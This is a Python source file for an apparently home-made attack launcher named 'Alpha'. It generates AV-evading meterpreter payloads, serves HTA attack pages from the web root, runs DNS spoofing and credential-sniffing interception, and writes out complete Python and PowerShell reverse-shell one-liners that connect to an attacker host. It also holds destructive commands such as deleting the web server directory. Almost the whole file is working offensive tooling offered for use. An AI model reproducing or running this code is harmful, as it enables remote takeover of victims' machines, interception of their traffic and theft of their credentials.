import os
import time
import string
import random
import requests
import base64
import netifaces as nat
import binascii
from tabulate import tabulate


Red = "\u001b[31m"
Green = "\u001b[32m"
Blue = "\033[94m"
orange='\033[33m'
pink='\033[95m'
lightred='\033[91m'
lightgreen='\033[92m'



os.system("clear")

print("""

          
 ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄      
▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄    
▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  
░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ 
 ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒
 ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░
  ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░
  ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒   
      ░  ░    ░  ░          ░  ░  ░      ░  ░
                                             
                                             
     
by Me 
                         """)
print("""++++++++++++++++++++++++ Start Service +++++++++++++++++++""")
os.system("service apache2 start")
os.system("service postgresql start")

print(Red+ """




1) HTA Attack
2) DNS Spoof
3) sniff
4) start lisenter
5) powershell reverse shell
""")


chose=int(input(lightred +"root@Attack# "))

def config():
  global interface
  global gateway

  interface = open("/opt/Alpha/tools/files/face.txt", "r").read()
  interface = interface.replace("\n", "")
  if interface=="0":

    interface=os.popen("route | awk '/Iface/{getline; print $8}'").read()
    interface=interface.replace("\n", "")
  else:
    print(Red +"[+] Interface errur")
  
  gateway=str(input("Enter your gateway = "))


def inplace_change(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)

z = random.randint(40,50)

S = z

ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))

def lisenter():
  lisen=str(input(Green+ "do u want to start lisenter Now ="))
  if lisen=="y":
    with open("handler/"+nameP+".rc", "w") as lisen:
      lisen.write("use exploit/multi/handler\n")
      lisen.write("set payload windows/meterpreter/reverse_%s \n" % (typeP))
      lisen.write("set LHOST %s \n" % (hostP))
      lisen.write("set LPORT %s \n" % (portP))
      lisen.write("exploit")
      lisen.close()
      os.system("msfconsole -r handler/%s.rc"% (nameP))

def cleanlog():
  clear_chose=str(input("Do u want to clear log (y/n) = "))
  if clear_chose=="y":
    os.system("sudo rm -rf /opt/Alpha/tools/sniff/%s.*" % (FinalFile))
    print("clean log done .")
  else:
    print("file still exist")
#file = open()

# Encrypt payload
class Encrypt:
    def __init__(self):
        self.YELLOW, self.GREEN = '\33[93m', '\033[1;32m'
        self.text = ""
        self.enc_txt = ""

    def encrypt(self, filename):
        print(f"\n{self.YELLOW}[*] Encrypting Source Codes...")
        with open(filename, "r") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines

            self.text = self.text.encode()
            self.enc_txt = base64.b64encode(self.text)

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
        time.sleep(2)
        print(f"{self.GREEN}[+] Code Encrypted\n")

Len = 8
randomtask = ''.join(random.choices(string.ascii_uppercase + string.digits, k=Len))




try:

  if chose==1 :
    chosePy=str(input("do you want to generate a Payload (y/n)= "))
    
    if chosePy=="y":

      
      hostP=str(input(orange+ "Enter LHOST = "))
      portP=int(input("Enter LPORT = "))
      typeP=str(input("Enter Payload type (tcp, http, https) = "))
      nameP=str(input("Enter Name of payload = "))

      os.system("msfvenom -p windows/meterpreter/reverse_%s LHOST=%s LPORT=%s SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1" % (typeP, hostP, portP))
      print(Blue+ "[+] Generating The Payload")
      inplace_change("payload.bat", "%COMSPEC%", "cmd.exe")
      with open("payload.bat") as reverseshell:
          thepay = reverseshell.read()
      os.system("cp -r template/payload.py  payloads/")
      os.system("cd payloads/ && mv payload.py " + nameP + ".py")
      inplace_change("payloads/" + nameP + ".py", "changeme", thepay)
      inplace_change("payloads/" + nameP + ".py", "RANDROMSTRING", ran)
      # Encrypt
      print("Adding Some Junk Code To Evade AV :)")
      time.sleep(1)
      #os.remove("payload.bat")
      enc = Encrypt()
      enc.encrypt("payloads/" + nameP + ".py")
      time.sleep(5)
      # --------
      print("[+] Encrypt The Payload")
      time.sleep(1)
      os.remove("payload.bat")
      os.system("")
      time.sleep(5)
      print("[+] Encrypted Done ...")
      print("Payload Saved in payloads/")
   
      lisenter()
      
      choseClean=str(input("do u want to clean the server= "))
      if choseClean=="y":

   
        print("[+] you need to change the file of server if you want a good Attack")
        print("[+] cleaning the server")
       #os.system("sudo su")
        os.system("sudo rm -rf /var/www/html/")
        os.system("sudo mkdir /var/www/html/")
        os.system("exit")
        print("[+] cleaning the server Done ...")
    elif chosePy=="n":
      print("[+] set The payload in the same folder ")
      NamePay=str(input("Enter name of compiled payload = "))
      os.system("rm -rf HTAfile")
      cwd = os.getcwd()
      os.system("sudo cp template/HTAfile.html %s" % (cwd))



      
      file = open("HTAfile.html", "a+")
      root=["""\n<iframe id="frame" src="%s" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>
<script type="text/javascript">setTimeout(function(){window.location.href="https://www.google.com/chrome";}, 15000);</script>\n</body>
        \n</html>""" % (NamePay)]
      file.writelines(root)
      file.close()
      #os.system("sudo rm -rf /var/www/html/")
      #os.system("sudo mkdir /var/www/html/")
      os.system("cp HTAfile.html /var/www/html")
      os.system("cp %s /var/www/html" % (NamePay))
  elif chose==2:
    print("[+] Starting The DNS Spoof Attack")
    def dnspoof():
      config()
      chose_scan=str(input(lightgreen +"Do you want to scan = "))
      if chose_scan=="y":
        os.system("nmap %s/24" % (gateway))
        #break
      else:
        print("[+] scan target Manuelly")
        #break
      print(orange +"""
                                                                         
█████ █████ █████ █████ █████ █████ █████ █████ █████ █████ 
                                                            
      """)
      target_phase=" --target "
      vistim = str(input(Green +"Enter IP of the Vistim = "))
      redirect_to=str(input("Enter IP redirected to = "))
      dns_conf="%s .*\.*" % (redirect_to)
      indns = open("/opt/Alpha/tools/files/dns.conf", "w")
      indns.write(dns_conf)
      indns.close()
      print("[+] Attack start")
      print("Ctrl + C to stop")
      Attack_Dns = os.system("xettercap %s %s --dns /opt/Alpha/tools/files/dns.conf --custom-parser DNS -I %s --gateway %s" % (target_phase, vistim, interface, gateway))
    


    dnspoof()
  elif chose==3:
    choseScan=str(input("Do you want to scan Network = "))
    if choseScan=="y":
      config()
      os.system("nmap %s/24" % (gateway))
    else:
      print("[+] scan the network manuelly")
    target_ip=str(input("Enter your Target ip = "))
    date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
    fileName= "%s-%s" % (target_ip, date) 
    FinalFile=fileName.replace("\n", "")
    #os.system("mkdir /opt/Alpha/tools/sniff")
    os.system("cd /opt/Alpha/tools/sniff/ && sudo touch %s.log" % (FinalFile))
    os.system("sudo touch %s.log" % (FinalFile))
    target_phase="--target "
    xterm_show_log = os.system("""xterm -geometry 100x24 -T 'Alpha' -hold -e "tail -f /opt/Alpha/tools/sniff/""" + FinalFile + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ip +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
    cmd_snif = os.system("xettercap --proxy " + target_phase + target_ip + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + interface + " --gateway " + gateway + " -O, --log /opt/Alpha/tools/sniff/" + FinalFile + ".log --sniffer-output /opt/Alpha/tools/sniff/" + FinalFile + ".pcap")
    cleanlog()
    

  elif chose==4:
    NameL=str(input("Enter name of the lisnter :"))
    os.system("msfconsole -r handler/%s.rc" % (NameL))
  elif chose==5:
    ip_shell=str(input("Enter Ip = "))
    port_shell=int(input("Enter Port = "))
    print("""
    1) Powershell payload
    2) python payload
    """)
    shellType=str(input("root@Attack# "))
    if shellType=="2":
      py = open("payload.py", "w")
      sroot=["""
      C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('%s', %s)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
      """ % (ip_shell, port_shell)]
      py.writelines(sroot)
      py.close()
      os.system("sudo cp payload.py /var/www/html")
      os.system("nc -nlvp %s" % (port_shell))
    elif shellType=="1":
      ps = open("powershell.ps1", "w")
      shellP="""
      powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
"""
      final_shell=shellP.replace("192.168.1.7", "%s" % (ip_shell))
      test_shell=""+final_shell+""
      finally_shell=test_shell.replace("4444", "%s" % (port_shell))
      #ps.writelines("""powershell -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""""" % (ip_shell, port_shell))
      ps.writelines(final_shell)
      ps.close()
      print("[*] Execute command in the powershell.ps1 manuelly and set PORT Manuelly")
      os.system("sudo cp powershell.ps1 /var/www/html")
      os.system("nc -nlvp %s" % (port_shell))
    else:
      print("errur")
  else:
    exit()

#except SyntaxError:
# exit()
except ValueError:
  exit()
